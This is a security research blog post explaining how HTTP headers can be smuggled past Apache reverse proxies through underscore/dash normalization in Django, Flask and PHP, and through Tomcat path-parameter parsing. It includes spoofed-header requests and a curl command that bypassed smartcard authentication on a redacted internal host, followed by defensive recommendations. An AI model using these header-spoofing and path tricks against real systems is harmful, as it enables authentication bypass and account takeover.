---
title: Smuggling HTTP headers through reverse proxies
description: Smuggling HTTP headers through reverse proxies
header: Smuggling HTTP headers through reverse proxies
---
Under some conditions, it is possible to smuggle HTTP headers through a reverse proxy, even if it was explicitly unset before. This is possible in some cases due to HTTP header normalization and parser differentials. Because HTTP headers are commonly used as way to pass authentication data to the backend (for example in mutual TLS scenarios), this can lead to critical vulnerabilities.

<!--more-->

In the following post, I will describe some theoretical and practical scenarios and how to abuse them. Some of these methods were used to bypass authentication for critical internal applications.

If you do not want to read the detailed description, there is [Recap](#Recap) at the end of this post.

## Client certificate authentication over a reverse proxy

During an audit of an internal platform, I took a deeper look at an authentication method we often use internally. This authentication is done via smartcard and offers a simple way for us to authenticate a user by his email address with a X509 client certificate. Because it's available to a lot of employees, it is a fast and better way to authenticate than old username plus password.

The process is easy to implement on the first thought. Our internal guidelines, as well as a lot of popular resources on the Internet, use something like this:

1) A reverse proxy in front of the backend does the mutual TLS (mTLS) flow and ensures a valid client certificate.
2) Some X509 fields like an email address or a full name are extracted from the certificate.
3) The fields are added as additional headers and the request is forwarded to the backend.
4) The backend authenticates the user (by the passed fields).

You see what can be a big problem here: Only some headers will separate an attacker from an authentication bypass (or some privilege escalation).

To prevent this, it is usually recommended to **unset headers passed in the original request**.

This is an example configuration:

```apache
<VirtualHost *:443>
    # activate HTTPS on the reverse proxy
    SSLEngine On
    SSLCertificateFile    /etc/apache2/ssl/mycert.crt
    SSLCertificateKeyFile /etc/apache2/ssl/mycert.key

    <Location /auth/cert>
        # activate the client certificate authentication
        SSLCACertificateFile /etc/apache2/ssl/client-accepted-ca-chain.crt
        SSLVerifyClient require
        SSLVerifyDepth 3

        # enrich request with client certificate data
        RequestHeader set SSL_CLIENT_S_DN "%{SSL_CLIENT_S_DN}s"

        ProxyPass          http://localhost:8080/
        ProxyPassReverse   http://localhost:8080/
    </Location>
</VirtualHost>
```

So in theory, this looks pretty safe. But as you might have already guessed - it's not (always). Let us first explore how normalization may result in unexpected behaviour.

## Normalization, attacker's best friend

Depending on the combination of reverse proxy, backend software and even framework used, an attacker passed HTTP header will be normalized and may interfere with "filters" which are set in place.

For every following scenario, I will use the following Apache configuration. This will unset/remove the header `CLIENT_VERIFIED` and then pass the request to an application running at :1337.

```apache
RequestHeader unset CLIENT_VERIFIED

<Location />
    ProxyPass          http://localhost:1337/
    ProxyPassReverse   http://localhost:1337/
</Location>
```

Before diving into this, I was a bit surprised that what I tried even nearly worked. As can be read in a lot of posts and documentation, Apache and Nginx will *silently drop all headers with underscores* in them. However I found some problems with this: This is **not done when requests are passed via ProxyPass on Apache**. This seems to be overlooked by a lot of frameworks which [falsely document this behavior](https://www.djangoproject.com/weblog/2015/jan/13/security/).

The [apache documentation](https://httpd.apache.org/docs/trunk/env.html#setting) states that this is happening when HTTP headers are passed via environment variables:

> A special case are HTTP headers which are passed to CGI scripts and the like via environment variables (see below). They are converted to uppercase and only dashes are replaced with underscores; if the header contains any other (invalid) character, the whole header is silently dropped

### Apache and django (deployed with gunicorn)

In the backend I've setup a simple django application with the following code, which returns all
headers:
```python
def index(request):
    headers = [f"{k}:{v}" for k,v in request.META.items()]
    return HttpResponse('\n'.join(headers))
```

So with the configuration above, the following request will of course not pass `CLIENT_VERIFIED` to the backend, because Apache will unset it before:
```http
GET / HTTP/1.1
Host: localhost
CLIENT_VERIFIED: pwn@pwn.com
```

Now let's take a step back first. How does django/python/gunicorn handle a HTTP request? Python usually does this over [WSGI](https://wsgi.readthedocs.io/en/latest/what.html), a specification describing how a web server communicates with a web application. It's derived from CGI times. As soon as CGI is (or was) involved, things get a bit strange. Because of how headers were passed in the CGI days as environment variables, there was a problem with hyphens (and underscores) in header names. This led to the decision to normalize these header values:

> When HTTP headers are placed into the WSGI environ, they are normalized by converting to uppercase, converting all dashes to underscores, and prepending HTTP_.

A header passed as "foo-bar" to a django app is therefore converted/normalized to `HTTP_FOO_BAR`. If you add 1 and 1 now, you should see how this will implicate our scenario:

![](/assets/images/header-smuggling_apache2_django_gunicorn.png)

The `unset` (or `set` to an empty string) in the Apache config is therefore ineffective.

This conflation was already documented in a [security advisory by django](https://www.djangoproject.com/weblog/2015/jan/13/security/) some years ago. The mentioned fix ("In order to prevent such attacks, both Nginx and Apache 2.4+ strip all headers containing underscores from incoming requests by default.") does not happen in a reverse proxied environment. However, even if this would be done, we are not using underscores in our request here, because they are converted to underscores anyway.

**Important:** This also works if apache unsets a hyphen header name (like `CLIENT-VERIFIED`). You can then just pass the header with an underscore (like `CLIENT_VERIFIED`) and django will happily convert it to `HTTP_CLIENT_VERIFIED`.

### Apache and flask (deployed with gunicorn)

Flask (which makes use of [werkzeug](https://github.com/pallets/werkzeug)) has its own way of handling headers (and hyphens). The following code was used (in the flask app):

```python
@app.route('/')
def index():
    headers = [f"{k}:{v}" for k,v in request.headers]
    header_str = '\n'.join(headers)
    is_authenticated = request.headers.get('CLIENT_VERIFIED', False)
    return f"{header_str}\n\n{is_authenticated}"
```

This code will print out all headers and echo if there is a `CLIENT_VERIFIED` value passed (which - based on the Apache config - should not be possible).

Let's give it a try:

Request:
```http
GET /login_cst HTTP/1.1
Host: 127.0.0.1
CLIENT_VERIFIED: foobar
```

Response:
```http
HTTP/1.1 200 OK
Date: Wed, 22 Apr 2020 18:16:07 GMT
Server: gunicorn/20.0.4
Content-Type: text/html; charset=utf-8
Content-Length: 160
Vary: Accept-Encoding

Host:localhost:1337
X-Forwarded-For:10.0.2.2
X-Forwarded-Host:127.0.0.1
X-Forwarded-Server:10.0.2.15
Connection:Keep-Alive

False
```

As you can see here, Flask (werkzeug) does its own normalization here, capitalizing each word and converting to hyphens.

Now let's try to abuse this normalization and bypass the "authentication":

![](/assets/images/header-smuggling_apache2_flask_gunicorn.png)

You can see here that `is_authenticated` returned a value. This is possible because werkzeug [overwrites](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/datastructures.py#L1358) the `__getitem__` method, replacing hyphens with underscores. This way, our smuggled header is now accessible at `request.headers.get('CLIENT_VERIFIED')`. Great success!

I have to admit at this point that one of my own applications I wrote was vulnerable to exactly this attack. The main problem here is that (a) I accepted the auth headers in a middleware and therefore not under a specific path, and that (b) header normalization lead to bypassing of the `unset`.

**Important:** This method also works the other way around: If Apache unset's a header like `FOO-BAR`, we can just send `FOO_BAR` which will be normalized and is then still accessible in flask with `request.headers.get('FOO-BAR')`.

### Apache and PHP

PHP does work the same way as django here, normalizing a `client-verified` header and making it available under `$_SERVER['HTTP_CLIENT_VERIFIED']`. The backend is not able to distinguish if it was also originally sent as `CLIENT_VERIFIED` (from a potential reverse proxy) or directly from the client.

```http
GET /phpinfo.php HTTP/1.1
Host: 127.0.0.1
client-verified: pwned@pwned.com
```

```html
[...]
<tr><td class="e">$_SERVER['HTTP_CLIENT_VERIFIED']</td><td class="v">pwned@pwned.com</td></tr>
[...]
```

## Intentionally duplicating headers

There is also some interesting behaviour when the reverse proxy sets a header (for example `SSL_Test`) and the clients chooses a header name which will be the same, after normalization: `SSL-Test`. After normalization, this header will be `SSL_TEST`.

When doing this with Apache and flask/django, the headers are concatenated - with the client header first:

```apache
<VirtualHost *:443>
    # [...]
    <Location />
        RequestHeader set SSL_Test "some@user.com"

        ProxyPass http://localhost:1337/
        ProxyPassReverse http://localhost:1337/
    </Location>
</VirtualHost>
```

The result (in this example from django):
`HTTP_SSL_TEST:foobar,some@user.com`

As you can see, the client value is prepended. While I have to agree that its not very promising in this situation, this may become handy when adding a value to `X-Forwarded-For`, `X-Forwarded-Host`, etc. which is set by Apache by default:

![](/assets/images/header-smuggling_apache2_forwarded_for.png)

Now let's take the following nginx configuration, where the result looks a bit more promising:

```nginx
server {
    listen 80 default_server;

    location /foo {
        proxy_set_header SSL_Test "some@user.com"
        proxy_pass http://localhost:1337
    }
}
```

The resulting response (flask):

`Ssl-Test: some@user.com,foobar` (or for django `SSL_TEST: some@user.com,foobar`).

A direct match can not be bypassed with this, but you may have success passing some filters. An example could be using a filter to match for a `@corp.com` suffix:

```python
@app.route("/login")
def login_certificate():
    email = request.headers.get('SSL_CLIENT_S_DN_Email', False)

    if not email.endswith('@corp.com'):
        return abort(403)

    return "authenticated"
```

Sending `@corp.com` as a header value now will bypass the above method then, because it will be appended and therefore `endswith` returns a success:

```
SSL_CLIENT_S_DN_EMAIL: some@user.com,@corp.com
```

## A real world authentication bypass

There was a slightly different scenario on some internal platforms. The authentication configuration differed in a substantial part (to the one I described in the beginning of this article). It looked like this:

```apache
<VirtualHost *:443>
    # virtualhost config
    # [...]

    <Location /auth/cert/smartcard.xhtml>
        # do client certification stuff
        SSLVerifyClient require
        SSLVerifyDepth  3
        SSLOptions +StrictRequire +StdEnvVars

        # set headers for backend
        RequestHeader set SSL_CLIENT_S_DN_Email "%{SSL_CLIENT_S_DN_Email}s"
        RequestHeader set SSL_CLIENT_S_DN_CN "%{SSL_CLIENT_S_DN_CN}s"
        RequestHeader set SSL_CLIENT_VERIFY "%{SSL_CLIENT_VERIFY}s"
    </Location>

    ProxyPass          http://localhost:8443/
    ProxyPassReverse   http://localhost:8443/
</VirtualHost>
```

As you can see, the authentication headers were only set when client authentication was handled (said otherwise: the path matched). The backend application (a Java application running on Tomcat) only accepted this specific headers under the `/auth/cert/smartcard.xhtml` path. Example authentication flow:

1. User requests `/auth/cert/smartcard.xhtml`
2. Apache will ensure that the client sends a valid certificate
3. Apache will enrich the original request with authentication information extracted from the certificate and forward it.
4. Backend receives the enriched requests at `/auth/cert/smartcard.xhtml`

Because an attacker cannot reach the `/auth/cert/smartcard.xhtml` directly, it's not possible to pass the specified `SSL_*` headers and fulfill the authentication. Therefore a bypass is not possible. Or is it?

The critical assumption here is that the frontend webserver always **interprets the path the same way the backend does**. If they do not, you may slip through the `Location`-block of the reverse proxy check and pass the authentication headers directly to backend.

I remembered some Blackhat talk about [parser logic by Orange Tsai](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) some years ago talking about this and some odd behaviour for Tomcat (which was running here on the backend). A path like `/auth/cert;foo=bar/smartcard.xhtml` will be parsed as `/auth/cert/smartcard.xhtml`, because foo=bar will be interpreted as a parameter.

Here is the path interpretation of `/auth/cert;foo=bar/smartcard.xhtml`:

|          | Interpreted Path                   |
|----------|------------------------------------|
| Apache   | /auth/cert;foo=bar/smartcard.xhtml |
| Nginx    | /auth/cert;foo=bar/smartcard.xhtml |
| IIS      | /auth/cert;foo=bar/smartcard.xhtml |
| Tomcat   | /auth/cert/smartcard.xhtml         |
| Jetty    | /auth/cert/smartcard.xhtml         |
| WildFly  | /auth/cert/smartcard.xhtml         |
| WebLogic | /auth/cert/smartcard.xhtml         |

Combining the fact that (a) Apache will not remove our underscore headers with the (b) path normalization behavior, we can successfully bypass the Apache certificate check and directly send the authentication headers to the backend. This will allow an authentication bypass and account takeover.

```bash
$ curl --path-as-is 'https://redacted.telekom.de/auth/cert;foo=bar/smartcard.xhtml' \
    -H 'SSL_CLIENT_S_DN_Email: user@email.com' \
    -H "SSL_CLIENT_S_DN_CN: User Name" \
    -H "SSL_CLIENT_VERIFY: SUCCESS"
```

Don't be fooled here that only Apache with Tomcat can be vulnerable. I am sure there are other combinations of components where frontend and backend will interpret the path differently. Only a slight difference is in this scenario needed for a full authentication bypass.

## Recap

* In some scenarios, HTTP header names can be spoofed via underscore/dash conflation
* WSGI frameworks like django or flask assume it's the reverse proxy's job to strip out underscore headers
* Apache **does not** strip out headers with underscores for requests passed via `ProxyPass` and some other modules
* Nginx **does** strip out headers with underscores for requests passed via `proxy_pass` (unless `underscores_in_headers` is on)
* If a HTTP header name with hyphens is passed, WSGI-based frameworks and PHP will normalize the header, disallowing the user to distinguish how it was originally passed
* HTTP headers matching this criteria used in a security-sensitive way can be abused this way to bypass authentication
* In some cases, path parsing differentials will also lead to an authentication bypass

I did not check every possible combination of components, but for the ones I looked at, I can give this short overview for Apache. Nginx will not pass underscores, but the hyphen/underscore conversion stays the same:

|                  | Allows underscores     | Converts `_` to `-`  | Converts `-` to `_` |
|------------------|------------------------|----------------------|---------------------|
| apache &rarr; django |          ✓         |                      |         ✓           |
| apache &rarr; flask  |          ✓         |           ✓          | <sup>1</sup>        |
| apache &rarr; php    |                    |                      |         ✓           |
| apache &rarr; tomcat<sup>2</sup> |      ✓ |                      |                     |
| apache + php module  |                    |                      |         ✓           |

<sup>1</sup> hyphens are not converted, but all hyphen headers are still accessible with underscores.

<sup>2</sup> path parsing differentials dangerous

### Nginx (and possibly other reverse proxies)

As you might have noticed, this writeup mainly focuses on Apache in reverse proxy scenarios. This is due to the fact that nginx will strip out all underscore headers by default.

Some interesting behaviour for nginx occurs when headers are set twice (due to normalization). While passing underscore headers do not work for nginx, headers with hyphens may still be converted at the backend.

If a reverse proxy does not strip out underscore headers, the same techniques as used for Apache can be applied. The only other reverse proxy I tested was [Caddy](https://caddyserver.com/), which also does not strip underscore headers.

## Severity and Impact

As described above, this does not mean that every Apache-mTLS-as-a-reverse-proxy scenario is problematic. The main point of this post is to highlight unexpected behavior when dealing with specific headers and configurations. Some combinations and configuration will be problematic, some won't. For the Apache+Tomcat example, this can lead to a critical vulnerability. This is also of course not always the case.

In the scenario described in the beginning of this post, where Apache is used with a WSGI-based component and `ProxyPass`, mTLS is used on the root level. This lowers the impact from an authentication bypass to an account takeover, because an attacker is not able to bypass the initial mTLS.

When authentication headers are only accepted at a specific path, a potential attacker is required to use a path differential to fully smuggle headers.

While this posts tries to give an example for a theoretic mTLS authentication scenarios, there are a few other interesting headers which might be smuggled: `X-Forwarded-For`, `X-Forwarded-Host`, `X-Real-Ip`, etc. If the backend application for examples adds authentication based on the IP address, an attacker might use one of the tricks above to get his own header value to be passed to the backend.

To vulnerability caused by a combination of components and the impact highly depends on the components in use and their configuration.

## Recommendations

There are a lot of components and scenarios which can have devastating effects. However, we came to the following measures which prevent all scenarios we can think of:

1. **Always** unset/clear the authentication headers at root level (and not just in the `Location` block, which is relevant for authentication).
2. **Do not use** underscores or hyphens in security-sensitive HTTP header names, unless you specifically checked if and how normalization is done and all variations are stripped out at the reverse proxy level.
3. **Consider using** a secret in an authentication block (like `<Location>` in Apache) which is checked against in the backend. This way, even if the attacker is able to abuse a parser differential like with Apache and Tomcat, the attacker does not know the secret and the backend is able to notice the forgery.


‒ **Robin Verton** ([@robinverton](https://twitter.com/RobinVerton)). Big thanks also to **Simon Peters**, who researched this topic with me.
